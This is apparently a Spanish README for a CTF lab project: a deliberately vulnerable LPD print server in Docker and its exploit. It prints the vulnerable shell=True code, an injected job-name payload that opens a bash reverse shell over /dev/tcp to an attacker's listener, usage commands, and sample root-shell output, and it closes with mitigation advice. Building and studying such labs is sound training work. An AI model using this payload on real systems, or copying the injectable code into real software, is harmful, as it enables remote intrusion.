# lpd-vuln

Servidor **LPD** (Line Printer Daemon) deliberadamente vulnerable a **inyección de comandos**, junto con un exploit que lo aprovecha para obtener una reverse shell.

> ⚠️ **Uso educativo / CTF únicamente.** El código contiene una vulnerabilidad intencional.
> No lo expongas en una red con equipos reales ni lo uses contra sistemas sin autorización explícita.

---

## Índice

- [Arquitectura](#arquitectura)
- [Requisitos](#requisitos)
- [Puesta en marcha](#puesta-en-marcha)
- [Uso del exploit](#uso-del-exploit)
- [Cómo funciona la vulnerabilidad](#cómo-funciona-la-vulnerabilidad)
- [El protocolo LPD (resumen)](#el-protocolo-lpd-resumen)
- [Estructura del repositorio](#estructura-del-repositorio)
- [Mitigación](#mitigación)

---

## Arquitectura

```
┌──────────────────┐        TCP :1515        ┌──────────────────────┐
│   exploit.py     │ ──────────────────────▶ │   server.py          │
│  (atacante)      │   protocolo LPD         │  (contenedor Docker) │
│                  │ ◀────────────────────── │                      │
│  ncat -lvnp PORT │      acuses \x00/\x01    │  shell=True (VULN)   │
└──────────────────┘                         └──────────────────────┘
```

El servidor escucha en el puerto **1515** (el estándar de LPD es el 515, aquí se usa
1515 para no requerir privilegios). Cada conexión se atiende en un hilo propio.

---

## Requisitos

- **Docker** y **Docker Compose** (para el servidor)
- **Python 3.8+** en el host (para el exploit)
- **ncat** o similar en el host para escuchar la reverse shell

---

## Puesta en marcha

```bash
# Levantar el servidor vulnerable
docker compose up -d --build

# Comprobar que responde
docker compose logs -f lpd
#   LPD vulnerable listening on 1515
```

El servicio queda publicado solo en localhost (`127.0.0.1:1515`), lo que limita
el daño en caso de que alguien ejecute el exploit por error.

Para detenerlo:

```bash
docker compose down
```

---

## Uso del exploit

1. **Abre un listener** en tu máquina (atacante):

   ```bash
   ncat -lvnp 4444
   ```

2. **Ejecuta el exploit:**

   ```bash
   python3 exploit.py --target 127.0.0.1 --lhost <TU_IP> --lport 4444
   ```

3. **Recibe la shell:**

   ```
   bash: cannot set terminal process group: no job control in this shell
   bash: /dev/tty: no such device or address
   $ id
   uid=0(root) gid=0(root) groups=0(root)
   ```

### Opciones

| Argumento   | Por defecto | Descripción                                  |
| ----------- | ----------- | -------------------------------------------- |
| `--target`  | *obligatorio* | IP de la máquina víctima                   |
| `--lhost`   | *obligatorio* | IP de la máquina atacante (para la shell)   |
| `--lport`   | *obligatorio* | Puerto del listener del atacante            |
| `--port`    | `1515`      | Puerto LPD de la víctima                    |
| `--queue`   | `cola`      | Nombre de la cola (debe coincidir con `LPD_QUEUE`) |
| `--delay`   | `0.3`       | Pausa (segundos) tras enviar el nombre de cola |

### Ejemplo completo

```bash
# Terminal 1 – listener
ncat -lvnp 4444

# Terminal 2 – exploit
python3 exploit.py --target 127.0.0.1 --lhost 192.168.1.50 --lport 4444
```

---

## Cómo funciona la vulnerabilidad

`server.py` extrae el nombre del job del **control file** LPD (la línea que
empieza por `J`) y lo interpola directamente en un comando de shell:

```python
# server.py
job_name = line[1:]                    # controlado por el cliente

# VULNERABLE
subprocess.Popen(
    f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True
)
```

No hay ninguna sanitización: `job_name` procede de la red y se concatena dentro
de una comilla simple. El exploit rompe esa comilla y encadena su propio
comando:

```python
# exploit.py
cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
job_name = f"x' >> /tmp/archive.log; {cmd}; echo '"
```

El shell termina ejecutando algo equivalente a:

```bash
echo 'Archive: x' >> /tmp/archive.log; bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'; echo '' >> /tmp/archive.log
```

El remanente `echo '` al final se añade para que las comillas queden
balanceadas y el comando de cierre del servidor no falle.

### Secuencia de mensajes

```
Cliente → Servidor :  \x02 + "cola"          (recv job)
Servidor → Cliente :  (sin respuesta)
Cliente → Servidor :  \x02 + "37"            (cabecera: tamaño en ASCII)
Servidor → Cliente :  \x00                  (ack)
Cliente → Servidor :  "J<payload>\n"         (control file)
Servidor → Cliente :  \x00 \x00              (acks)
                       └── en este punto se lanza el comando
```

---

## El protocolo LPD (resumen)

| Byte / campo | Significado                                        |
| ------------ | -------------------------------------------------- |
| `\x02`       | *Receive job* / cabecera de control file           |
| `\x01`       | Cola rechazada                                     |
| `\x00`       | Aceptado (ack)                                     |
| `J...`       | Línea de control *job name* del control file       |
| `C...`       | Línea de control *class*                           |
| `\x04`       | *Receive job* con cola ya seleccionada (no usado)  |

El servidor solo valida que el nombre de cola coincida con `LPD_QUEUE`
(por defecto `cola`); todo lo demás del control file se trata como confiable.

---

## Estructura del repositorio

```
lpd-vuln/
├── Dockerfile          # python:3.12-slim, expone 1515
├── docker-compose.yml  # publica 127.0.0.1:1515
├── server.py           # servidor LPD vulnerable
├── exploit.py          # exploit: inyección de comandos → reverse shell
└── README.md
```

### Variables de entorno

| Variable    | Por defecto | Descripción                          |
| ----------- | ----------- | ------------------------------------ |
| `LPD_QUEUE` | `cola`      | Nombre de cola aceptado por el servidor |

---

## Mitigación

Si quisieras dejar de lado la vulnerabilidad:

1. **No usar `shell=True`** con datos externos. Ejecutar la lista de argumentos:

   ```python
   subprocess.Popen(["echo", f"Archive: {job_name}"], stdout=..., ...)
   ```

2. **Validar `job_name`** contra un patrón estricto (p. ej. `^[A-Za-z0-9._-]+$`)
   antes de usarlo en cualquier sitio.

3. **No interpolar entrada de red** dentro de comandos, rutas de archivo ni
   consultas SQL.

4. **Ejecutar el servicio sin privilegios** y con un sistema de ficheros
   efímero (el propio contenedor ya ayuda a esto).

---

## Licencia

Proyecto de demostración / laboratorio. Úsalo bajo tu propia responsabilidad
y únicamente en entornos que controles.
